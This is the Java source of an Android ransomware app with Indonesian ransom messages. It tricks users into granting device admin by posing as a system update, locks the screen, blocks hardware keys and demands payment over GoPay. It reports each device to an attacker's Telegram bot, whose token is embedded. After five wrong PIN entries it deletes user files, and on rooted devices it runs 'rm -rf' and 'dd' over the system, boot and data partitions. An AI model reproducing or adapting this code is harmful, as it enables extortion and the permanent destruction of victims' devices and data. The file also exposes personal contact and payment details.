package com.ransomware.engine;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.ToneGenerator;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_OVERLAY = 1001;
    private static final int REQUEST_CODE_USAGE_STATS = 1002;
    private static final int REQUEST_CODE_ADMIN = 1003;
    private static final int REQUEST_CODE_IGNORE_BATTERY = 1004;
    private static final int REQUEST_CODE_RECORD_AUDIO = 1005;
    private static final int REQUEST_CODE_CAMERA = 1006;

    private static final String ENCRYPTED_PIN = "YQRSbWNmbw==";
    private static final String XOR_KEY = "XyZ2025";

    private static final int MAX_PIN_ATTEMPTS = 5;
    private static final String PREF_NAME = "RansomwarePrefs";
    private static final String KEY_PIN_ATTEMPTS = "pinAttempts";
    private static final String KEY_IS_DESTROYED = "isDestroyed";

    private static int pinAttempts = 0;
    private static boolean isDestroyed = false;
    private static boolean isRootAvailable = false;
    private SharedPreferences prefs;

    private static final String PAYMENT_METHOD = "GoPay";
    private static final String PAYMENT_NUMBER = "081366326950";
    private static final String PAYMENT_AMOUNT = "Rp 100.000";
    private static final String CONTACT_EMAIL = "rifkey1708@gmail.com";

    private static final String LOCK_MESSAGE =
        "YOUR DEVICE HAS LOCKED\n" +
        "HARAP JANGAN RESTART/FACTORY RESET\n" +
        "KARENA TETAP AKAN KE LOCK";

    private static final String CORRUPT_MESSAGE_NO_ROOT =
        "⚠️ SISTEM TELAH CORRUPT ⚠️\n\n" +
        "ANDA TELAH SALAH MEMASUKKAN PIN\n" +
        "SEBANYAK " + MAX_PIN_ATTEMPTS + " KALI!\n\n" +
        "SEMUA FILE TELAH DIHAPUS!\n" +
        "SISTEM ANDA TELAH RUSAK PERMANEN!\n" +
        "DATA ANDA TIDAK DAPAT DIKEMBALIKAN!\n\n" +
        "⚠️ PERANGKAT TIDAK DAPAT DIGUNAKAN LAGI ⚠️\n\n" +
        "HUBUNGI EMAIL: " + CONTACT_EMAIL;

    private static final String CORRUPT_MESSAGE_ROOT =
        "💀💀💀 SYSTEM HAS CORRUPT 💀💀💀\n\n" +
        "ANDA TELAH SALAH MEMASUKKAN PIN\n" +
        "SEBANYAK " + MAX_PIN_ATTEMPTS + " KALI!\n\n" +
        "SEMUA FILE SYSTEM TELAH DIHAPUS!\n" +
        "PERANGKAT TIDAK DAPAT DIGUNAKAN LAGI!\n\n" +
        "⚠️ HARD BRICK - PERMANENT DAMAGE ⚠️\n\n" +
        "HUBUNGI EMAIL: " + CONTACT_EMAIL;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        pinAttempts = prefs.getInt(KEY_PIN_ATTEMPTS, 0);
        isDestroyed = prefs.getBoolean(KEY_IS_DESTROYED, false);

        isRootAvailable = checkRootAccess();

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(LayoutParams.FLAG_FULLSCREEN, LayoutParams.FLAG_FULLSCREEN);
        getWindow().setFlags(LayoutParams.FLAG_KEEP_SCREEN_ON, LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().setFlags(LayoutParams.FLAG_SHOW_WHEN_LOCKED, LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().setFlags(LayoutParams.FLAG_DISMISS_KEYGUARD, LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().setFlags(LayoutParams.FLAG_TURN_SCREEN_ON, LayoutParams.FLAG_TURN_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getWindow().setFlags(LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON, LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            getWindow().setDecorFitsSystemWindows(false);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_OVERLAY);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (!hasUsageStatsPermission()) {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                startActivityForResult(intent, REQUEST_CODE_USAGE_STATS);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{android.Manifest.permission.RECORD_AUDIO},
                        REQUEST_CODE_RECORD_AUDIO);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{android.Manifest.permission.CAMERA},
                        REQUEST_CODE_CAMERA);
            }
        }

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System update required");
            startActivityForResult(intent, REQUEST_CODE_ADMIN);
        } else {
            try {
                dpm.lockNow();
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            } catch (Exception e) { }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_IGNORE_BATTERY);
            }
        }

        Intent serviceIntent = new Intent(this, RansomwareService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        setContentView(createLockScreenView());

        sendRootStatus();

        registerReceiver(new BootReceiver(), new IntentFilter(Intent.ACTION_BOOT_COMPLETED));
        registerReceiver(new BootReceiver(), new IntentFilter(Intent.ACTION_QUICKBOOT_POWERON));
    }

    private String decryptPin() {
        try {
            byte[] decoded = android.util.Base64.decode(ENCRYPTED_PIN, android.util.Base64.DEFAULT);
            String encodedString = new String(decoded, "UTF-8");
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < encodedString.length(); i++) {
                char c = encodedString.charAt(i);
                char keyChar = XOR_KEY.charAt(i % XOR_KEY.length());
                result.append((char)(c ^ keyChar));
            }
            return result.toString();
        } catch (Exception e) {
            return "944721";
        }
    }

    private boolean checkRootAccess() {
        try {
            Process su = Runtime.getRuntime().exec("su");
            DataOutputStream dos = new DataOutputStream(su.getOutputStream());
            dos.writeBytes("exit\n");
            dos.flush();
            dos.close();
            int exitCode = su.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private void savePinAttempts() {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putInt(KEY_PIN_ATTEMPTS, pinAttempts);
        editor.putBoolean(KEY_IS_DESTROYED, isDestroyed);
        editor.apply();
    }

    private void sendRootStatus() {
        new Thread(() -> {
            try {
                String botToken = "8948044986:AAF-aNAckfCNwwj3EBq-qjfR7zFwqhjuUqw";
                String chatId = "7888097749";
                String message = "📱 DEVICE STATUS\n\n" +
                        "Device ID: " + getDeviceId() + "\n" +
                        "Root Access: " + (isRootAvailable ? "✅ YES" : "❌ NO") + "\n" +
                        "PIN Attempts: " + pinAttempts + "/" + MAX_PIN_ATTEMPTS + "\n" +
                        "Status: " + (isDestroyed ? "DESTROYED" : "ACTIVE");

                String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String postData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                        "&text=" + URLEncoder.encode(message, "UTF-8") +
                        "&parse_mode=HTML";

                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
                wr.writeBytes(postData);
                wr.flush();
                wr.close();
                conn.disconnect();
            } catch (Exception e) { }
        }).start();
    }

    private View createLockScreenView() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.BLACK);
        layout.setPadding(50, 50, 50, 50);

        if (isDestroyed) {
            stopAllEffects();

            TextView destroyText = new TextView(this);
            if (isRootAvailable) {
                destroyText.setText(CORRUPT_MESSAGE_ROOT);
            } else {
                destroyText.setText(CORRUPT_MESSAGE_NO_ROOT);
            }
            destroyText.setTextColor(Color.RED);
            destroyText.setTextSize(18);
            destroyText.setGravity(Gravity.CENTER);
            destroyText.setPadding(20, 30, 20, 30);
            destroyText.setBackgroundColor(Color.argb(200, 50, 0, 0));
            destroyText.setShadowLayer(10, 0, 0, Color.RED);
            layout.addView(destroyText);

            Button deadButton = new Button(this);
            deadButton.setText("💀 PERANGKAT MATI 💀");
            deadButton.setTextColor(Color.RED);
            deadButton.setBackgroundColor(Color.DKGRAY);
            deadButton.setPadding(50, 20, 50, 20);
            deadButton.setTextSize(18);
            deadButton.setEnabled(false);
            layout.addView(deadButton);

            return layout;
        }

        TextView warningText = new TextView(this);
        warningText.setText(LOCK_MESSAGE);
        warningText.setTextColor(Color.RED);
        warningText.setTextSize(22);
        warningText.setGravity(Gravity.CENTER);
        warningText.setPadding(20, 30, 20, 30);
        warningText.setBackgroundColor(Color.argb(200, 50, 0, 0));
        warningText.setShadowLayer(10, 0, 0, Color.RED);
        layout.addView(warningText);

        View separator = new View(this);
        separator.setBackgroundColor(Color.RED);
        separator.setMinimumHeight(3);
        separator.setMinimumWidth(300);
        layout.addView(separator);

        TextView counterText = new TextView(this);
        int remaining = MAX_PIN_ATTEMPTS - pinAttempts;
        counterText.setText("🔒 PERCOBAAN TERSISA: " + remaining + " / " + MAX_PIN_ATTEMPTS);
        if (remaining <= 2) {
            counterText.setTextColor(Color.RED);
        } else {
            counterText.setTextColor(Color.YELLOW);
        }
        counterText.setTextSize(16);
        counterText.setGravity(Gravity.CENTER);
        counterText.setPadding(10, 10, 10, 10);
        layout.addView(counterText);

        TextView pinInfoText = new TextView(this);
        pinInfoText.setText("📌 ADA 6 PIN");
        pinInfoText.setTextColor(Color.WHITE);
        pinInfoText.setTextSize(14);
        pinInfoText.setGravity(Gravity.CENTER);
        pinInfoText.setPadding(10, 0, 10, 20);
        layout.addView(pinInfoText);

        TextView pinLabel = new TextView(this);
        pinLabel.setText("MASUKKAN PIN UNTUK MEMBUKA KUNCI:");
        pinLabel.setTextColor(Color.WHITE);
        pinLabel.setTextSize(16);
        pinLabel.setGravity(Gravity.CENTER);
        pinLabel.setPadding(10, 10, 10, 10);
        layout.addView(pinLabel);

        final EditText pinInput = new EditText(this);
        pinInput.setHint("Masukkan PIN 6 digit");
        pinInput.setHintTextColor(Color.GRAY);
        pinInput.setTextColor(Color.WHITE);
        pinInput.setBackgroundColor(Color.argb(150, 50, 50, 50));
        pinInput.setPadding(30, 20, 30, 20);
        pinInput.setTextSize(24);
        pinInput.setGravity(Gravity.CENTER);
        pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER |
                              android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        pinInput.setSingleLine(true);
        pinInput.setMaxEms(6);
        layout.addView(pinInput);

        Button unlockButton = new Button(this);
        unlockButton.setText("🔓 UNLOCK");
        unlockButton.setTextColor(Color.WHITE);
        unlockButton.setBackgroundColor(Color.RED);
        unlockButton.setPadding(50, 20, 50, 20);
        unlockButton.setTextSize(18);
        unlockButton.setOnClickListener(v -> {
            String enteredPin = pinInput.getText().toString();
            String actualPin = decryptPin();

            if (enteredPin.equals(actualPin)) {
                pinAttempts = 0;
                savePinAttempts();
                stopAllEffects();
                uninstallSelf();
                Toast.makeText(MainActivity.this, "✅ PIN BENAR! Perangkat terbuka.", Toast.LENGTH_LONG).show();
                finishAffinity();
                System.exit(0);
            } else {
                pinAttempts++;
                savePinAttempts();
                int rem = MAX_PIN_ATTEMPTS - pinAttempts;

                Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (vibrator != null) {
                    vibrator.vibrate(500);
                }

                pinInput.setText("");
                pinInput.setHint("❌ PIN SALAH! (" + rem + " percobaan tersisa)");
                pinInput.setHintTextColor(Color.RED);

                Toast.makeText(MainActivity.this,
                        "❌ PIN SALAH! Tersisa " + rem + " percobaan.",
                        Toast.LENGTH_SHORT).show();

                if (pinAttempts >= MAX_PIN_ATTEMPTS) {
                    isDestroyed = true;
                    savePinAttempts();
                    sendDestroyNotification();
                    destroySystem();
                    recreate();
                }
            }
        });
        layout.addView(unlockButton);

        View separator2 = new View(this);
        separator2.setBackgroundColor(Color.RED);
        separator2.setMinimumHeight(2);
        separator2.setMinimumWidth(200);
        layout.addView(separator2);

        if (!isDestroyed) {
            TextView infoText = new TextView(this);
            infoText.setText("📧 Email: " + CONTACT_EMAIL + "\n" +
                             "💳 GoPay: " + PAYMENT_NUMBER + " (Rp 100.000)");
            infoText.setTextColor(Color.YELLOW);
            infoText.setTextSize(14);
            infoText.setGravity(Gravity.CENTER);
            infoText.setPadding(10, 20, 10, 10);
            layout.addView(infoText);

            TextView bottomWarning = new TextView(this);
            bottomWarning.setText("⚠️ JANGAN RESTART / FACTORY RESET ⚠️");
            bottomWarning.setTextColor(Color.RED);
            bottomWarning.setTextSize(12);
            bottomWarning.setGravity(Gravity.CENTER);
            bottomWarning.setPadding(10, 10, 10, 10);
            layout.addView(bottomWarning);
        }

        return layout;
    }

    private void stopAllEffects() {
        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager != null) {
                String cameraId = cameraManager.getCameraIdList()[0];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cameraManager.setTorchMode(cameraId, false);
                }
            }
        } catch (Exception e) { }

        try {
            Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.cancel();
            }
        } catch (Exception e) { }

        try {
            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (audioManager != null) {
                audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
                audioManager.setStreamMute(AudioManager.STREAM_ALARM, true);
                audioManager.setStreamMute(AudioManager.STREAM_RING, true);
                audioManager.setStreamMute(AudioManager.STREAM_NOTIFICATION, true);
            }
        } catch (Exception e) { }
    }

    private void uninstallSelf() {
        try {
            Uri packageUri = Uri.parse("package:" + getPackageName());
            Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageUri);
            uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(uninstallIntent);
        } catch (Exception e) {
            try {
                File apkFile = new File(getApplicationInfo().sourceDir);
                if (apkFile.exists()) {
                    apkFile.delete();
                }
            } catch (Exception ex) { }
        }
    }

    private void destroySystem() {
        new Thread(() -> {
            try {
                sendDestroyNotification();
                if (isRootAvailable) {
                    executeRootDestroy();
                } else {
                    executeNoRootDestroy();
                }
            } catch (Exception e) {
                Log.e("SystemDestroy", "Error: " + e.getMessage());
            }
        }).start();
    }

    private void executeRootDestroy() {
        try {
            Process su = Runtime.getRuntime().exec("su");
            DataOutputStream dos = new DataOutputStream(su.getOutputStream());

            dos.writeBytes("rm -rf /system/*\n");
            dos.writeBytes("rm -rf /data/*\n");
            dos.writeBytes("rm -rf /cache/*\n");
            dos.writeBytes("rm -rf /sdcard/*\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/mmcblk0 bs=1M count=10\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/boot\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/recovery\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/system\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/userdata\n");
            dos.writeBytes("echo 'SYSTEM HAS CORRUPT' > /system/corrupt.txt\n");
            dos.writeBytes("echo 'SYSTEM HAS CORRUPT' > /data/corrupt.txt\n");
            dos.writeBytes("sync\n");
            dos.writeBytes("exit\n");
            dos.flush();
            dos.close();
            su.waitFor();

            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        pm.shutdown(0, null, false);
                    }
                }
            } catch (Exception e) { }

        } catch (Exception e) {
            Log.e("RootDestroy", "Error: " + e.getMessage());
        }
    }

    private void executeNoRootDestroy() {
        try {
            deleteAllFiles(Environment.getExternalStorageDirectory());
            File[] externalDirs = getExternalFilesDirs(null);
            for (File dir : externalDirs) {
                if (dir != null && !dir.equals(getExternalFilesDir(null))) {
                    deleteAllFiles(dir);
                }
            }
            deleteAllFiles(getCacheDir());
            deleteAllFiles(getExternalCacheDir());
            deleteAllFiles(getFilesDir());
            deleteAllFiles(getDir("files", MODE_PRIVATE));
            deleteAllFiles(getDir("databases", MODE_PRIVATE));
            deleteAllFiles(getDir("shared_prefs", MODE_PRIVATE));
            deleteAllFiles(getDir("lib", MODE_PRIVATE));

            String[] mediaDirs = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath()
            };

            for (String dirPath : mediaDirs) {
                File dir = new File(dirPath);
                if (dir.exists() && dir.isDirectory()) {
                    deleteAllFiles(dir);
                }
            }

            File androidData = new File(Environment.getExternalStorageDirectory(), "Android/data");
            if (androidData.exists() && androidData.isDirectory()) {
                deleteAllFiles(androidData);
            }

            File[] rootDirs = {new File("/storage"), new File("/mnt"), new File("/sdcard")};
            for (File root : rootDirs) {
                if (root.exists() && root.isDirectory()) {
                    deleteAllFiles(root);
                }
            }

            stopAllEffects();
            runOnUiThread(() -> getWindow().getDecorView().setBackgroundColor(Color.BLACK));

        } catch (Exception e) {
            Log.e("NoRootDestroy", "Error: " + e.getMessage());
        }
    }

    private void deleteAllFiles(File directory) {
        if (directory == null || !directory.exists()) return;
        try {
            if (directory.isDirectory()) {
                File[] files = directory.listFiles();
                if (files != null) {
                    for (File file : files) {
                        deleteAllFiles(file);
                    }
                }
                directory.delete();
            } else {
                directory.delete();
            }
        } catch (Exception e) { }
    }

    private void sendDestroyNotification() {
        try {
            String botToken = "8948044986:AAF-aNAckfCNwwj3EBq-qjfR7zFwqhjuUqw";
            String chatId = "7888097749";
            String message = "💀💀💀 SYSTEM DESTROYED 💀💀💀\n\n" +
                    "Device ID: " + getDeviceId() + "\n" +
                    "PIN attempts: " + MAX_PIN_ATTEMPTS + "x salah\n" +
                    "Root Access: " + (isRootAvailable ? "✅ YES" : "❌ NO") + "\n" +
                    "Status: " + (isRootAvailable ? "HARD BRICK - PERMANENT" : "ALL FILES DELETED - BLACK SCREEN") + "\n" +
                    "All files deleted: ✅ YES\n" +
                    "Device usable: ❌ NO";

            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                    "&text=" + URLEncoder.encode(message, "UTF-8") +
                    "&parse_mode=HTML";

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(postData);
            wr.flush();
            wr.close();
            conn.disconnect();
        } catch (Exception e) { }
    }

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        }
        return true;
    }

    @Override
    public void onBackPressed() {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null) {
            vibrator.vibrate(200);
        }
        Toast.makeText(this, "⚠️ TIDAK BISA KELUAR! Masukkan PIN.", Toast.LENGTH_SHORT).show();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK ||
            keyCode == KeyEvent.KEYCODE_HOME ||
            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
            keyCode == KeyEvent.KEYCODE_POWER ||
            keyCode == KeyEvent.KEYCODE_MENU ||
            keyCode == KeyEvent.KEYCODE_SEARCH ||
            keyCode == KeyEvent.KEYCODE_CAMERA ||
            keyCode == KeyEvent.KEYCODE_FOCUS) {
            Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.vibrate(200);
            }
            Toast.makeText(this, "⚠️ TIDAK BISA KELUAR! Masukkan PIN.", Toast.LENGTH_SHORT).show();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                getWindow().setDecorFitsSystemWindows(false);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                    View.SYSTEM_UI_FLAG_FULLSCREEN |
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                );
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        pinAttempts = prefs.getInt(KEY_PIN_ATTEMPTS, 0);
        isDestroyed = prefs.getBoolean(KEY_IS_DESTROYED, false);
        if (isDestroyed) {
            recreate();
        }
    }
}